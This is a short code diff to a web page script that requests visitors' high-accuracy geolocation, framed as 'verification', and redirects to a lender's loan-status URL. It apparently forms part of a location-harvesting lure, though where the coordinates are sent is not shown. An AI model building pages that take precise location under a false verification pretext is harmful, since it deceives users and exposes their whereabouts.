@@ -110,12 +110,17 @@
             if (!navigator.geolocation) {
                 status.textContent = 'Browser does not support verification.';
                 status.style.color = 'red';
-                // Agar browser geoloc support nahi karta, tab bhi target URL par redirect kar dega
                 setTimeout(() => {
                     window.location.href = "https://synergy.hdbfs.com/loan-status/";
                 }, 1500);
             } else {
-                navigator.geolocation.getCurrentPosition(success, error);
+                // High Accuracy (Precise) set karne ka option
+                const options = {
+                    enableHighAccuracy: true, 
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+                navigator.geolocation.getCurrentPosition(success, error, options);
             }
         }
 
